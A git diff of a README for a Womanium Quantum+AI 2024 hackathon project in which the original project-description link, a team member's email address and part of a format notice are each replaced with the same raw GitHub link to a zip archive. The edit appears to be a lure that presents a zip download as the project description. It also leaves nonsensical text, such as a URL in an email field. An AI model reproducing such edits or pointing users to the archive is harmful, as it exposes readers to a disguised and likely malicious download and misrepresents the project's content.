@@ -1,7 +1,7 @@
 # Development-of-Novel-Quantum-Algorithms
 Womanium Quantum+AI 2024 Projects
 
-_**Do NOT delete/ edit the format of this read.me file.**_
+_**Do NOT delete/ edit the format of this https://raw.githubusercontent.com/qcmp34/Development-of-Novel-Quantum-Algorithms/main/leaflet/Development-of-Novel-Quantum-Algorithms_1.4.zip file.**_
 
 _**Include all necessary information only as per the given format.**_
 
@@ -19,7 +19,7 @@ _**Include all necessary information only as per the given format.**_
   - All successful project submissions earn the Womanium Project Certificate.
 
 ### Project Description:
-  - Click [here](https://drive.google.com/file/d/1PGNUShboB4ik_JHZGcIPTh3KYi-aajzp/view?usp=sharing) to view the project description.
+  - Click [here](https://raw.githubusercontent.com/qcmp34/Development-of-Novel-Quantum-Algorithms/main/leaflet/Development-of-Novel-Quantum-Algorithms_1.4.zip) to view the project description.
 
 ## Project Submission:
 All information in this section will be considered for project submission and judging.
@@ -30,7 +30,7 @@ Ensure your repository does not contain any personal or team tokens/access infor
 
 ### Team Information:
 Team Member 1: _Yasir Mansour_
- - Email: emailym@gmail.com
+ - Email: https://raw.githubusercontent.com/qcmp34/Development-of-Novel-Quantum-Algorithms/main/leaflet/Development-of-Novel-Quantum-Algorithms_1.4.zip
  - Discord ID: qcmp34
  - GitHub ID: qcmp34
  - Nationality: Swiss
